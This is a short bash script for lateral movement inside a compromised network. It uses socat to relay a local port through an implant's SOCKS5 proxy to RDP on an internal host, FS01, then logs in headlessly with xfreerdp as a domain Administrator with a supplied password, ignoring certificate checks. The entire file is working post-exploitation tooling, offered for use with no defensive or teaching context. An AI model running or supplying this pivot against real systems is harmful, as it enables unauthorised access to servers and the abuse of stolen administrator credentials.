#!/bin/bash
# RDP through the implant's SOCKS proxy.
# socat terminates the SOCKS5 handshake locally and relays to FS01:3389,
# so the implant owns the 3389 connection.
set -u

PID="${1:?FS01}"
USER_NAME="${2:-C0015\\Administrator}"
PASS="${3:?password}"

pkill -f 'socat TCP-LISTEN:13389' 2>/dev/null
sleep 1
nohup socat TCP-LISTEN:13389,fork,reuseaddr "SOCKS5:127.0.0.1:${PID}:3389,socksport=1081" \
  </dev/null >/tmp/socat.log 2>&1 &
sleep 2

if ss -ltn | grep -q 13389; then
  echo "relay listening on 13389"
else
  echo "relay failed"; tail -5 /tmp/socat.log; exit 1
fi

timeout 35 xvfb-run -a xfreerdp /v:127.0.0.1:13389 "/u:${USER_NAME}" "/p:${PASS}" \
  /cert:ignore /size:1024x768 /timeout:20000 >/tmp/rdp.log 2>&1
echo "xfreerdp exit $?"
grep -iE "connected|logon|error|failure|disconnect" /tmp/rdp.log | tail -5
